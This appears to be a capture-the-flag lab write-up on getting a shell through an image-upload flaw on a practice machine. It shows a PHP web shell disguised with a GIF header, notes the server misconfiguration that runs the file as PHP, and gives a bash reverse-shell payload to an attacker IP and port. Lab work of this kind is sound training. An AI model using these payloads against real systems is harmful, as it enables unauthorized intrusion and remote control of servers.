# Getting a Shell 

## Uploading malicious php code to the web application http://10.10.10.146/upload.php
Content of the file (normally apache for execute php code, the file has to end in .php , but this machine execute php just to have php on the name. Odd, is not normal this.) 
### Explaination : bad code on the server, developer dont use <FilesMatch ".php$> on code 
### ($ sign means with have to end with this '.php$' -> end with .php)
```bash
$ cat shell.php.gif 
GIF8;
<?php system($_REQUEST['eris']); ?>

```

![[Pasted image 20211202122208.png]]

### Go to photos.php to check the file http://10.10.10.146/photos.php
![[Pasted image 20211202122307.png]]

![[Pasted image 20211202122340.png]]


### Sending the request to Burp to url encode (default config on client Request dont intercept images)
![[Pasted image 20211202122909.png]]


* payload
```bash
bash -c "bash -i >& /dev/tcp/10.10.14.21/9001 0>&1"
```
![[Pasted image 20211202123105.png]]

![[Pasted image 20211202123123.png]]